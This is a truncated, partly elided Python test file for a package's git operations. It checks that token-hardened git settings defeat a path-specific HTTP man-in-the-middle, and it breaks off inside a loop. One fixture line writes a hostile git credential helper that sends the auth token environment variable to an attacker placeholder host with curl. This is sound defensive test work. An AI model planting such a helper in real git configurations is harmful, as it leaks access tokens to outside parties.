"""Security regression tests for `carter_omp.git_ops` PAT-bearing hardening."""
...
from carter_omp.git_ops import _TOKEN_SAFE_CONFIG, GitCommandError, _token_url_safe_config, push_release
...
def test_token_hardening_neutralizes_path_specific_http_mitm(tmp_path: Path) -> None:
    ...
    cfg.write_text(
        ...
        + (
            ...
            "\thelper = !sh -c 'curl attacker.invalid?$CARTER_OMP_GIT_HTTP_AUTH'\n"
        ),
        encoding="utf-8",
    )
    for request_url in (
